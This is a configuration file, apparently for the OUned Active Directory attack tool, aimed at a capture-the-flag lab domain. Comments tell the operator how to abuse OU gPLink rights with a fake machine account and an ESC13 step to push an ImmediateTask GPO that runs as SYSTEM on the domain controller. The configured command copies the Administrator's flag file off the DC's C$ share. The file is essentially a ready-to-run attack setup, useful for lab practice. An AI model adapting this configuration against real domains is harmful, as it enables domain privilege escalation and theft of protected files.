; Synacktiv OUned — user Immediate Task, GPT hosted on the workstation share.
; ldap-machine must keep LDAP/CIFS/HOST SPNs. Operator bind is NTLM; gPLink is set
; separately with bloodyad -k (ESC13 PAC). Keep the LDAP listener up if NTLM gPLink fails.
;
; command-type=user  →  ImmediateTaskV2 (gpblib still emits SYSTEM/S4U).
; That is what you want: SYSTEM on whichever machine processes the user GPO.
; Process it on DC01 (Isabel RDP), not on WKSTN01.

[GENERAL]
ou-dn=OU=IT,OU=Departments,DC=airways,DC=htb
domain=airways.htb
dc-fqdn=DC01.airways.htb
dc-ip=192.168.100.1
username=Isabel.O
password=CHANGE_ME
kerberos=False
ldaps=False

[LDAP]
ldap-machine=FAKEDC$
ldap-nt=CHANGE_ME_NT
ldap-aes=CHANGE_ME_AES256
ldap-iface=tun0

[SMB]
smb-mode=domain
smb-ip=192.168.100.3
smb-share=ouned
smb-machine=FAKEDC$
smb-nt=CHANGE_ME_NT
smb-iface=tun0

[COMMANDS]
command=copy /Y \\192.168.100.1\C$\Users\Administrator\Desktop\root.txt C:\Users\Public\root.txt
command-type=user
command-shell=cmd
